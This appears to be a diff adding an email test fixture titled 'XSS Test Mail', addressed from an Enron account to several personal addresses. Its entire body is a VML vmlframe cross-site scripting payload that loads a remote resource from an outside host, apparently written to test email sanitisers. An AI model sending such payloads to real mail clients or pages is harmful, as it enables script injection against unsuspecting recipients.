@@ -1,0 +1,4 @@
+From: gay.arnold@enron.com
+To: b22257@gte.net, smithdl@tca.net, poho54@bluebon.net, 
+Subject: XSS Test Mail
+<vmlframe xmlns="url:schemas-microsoft-com:vml" style="behavior:url(#default#vml);position:absolute;width:100%;height:100%" src="http://xsst.tk/mail.vml#xss"></vmlframe>
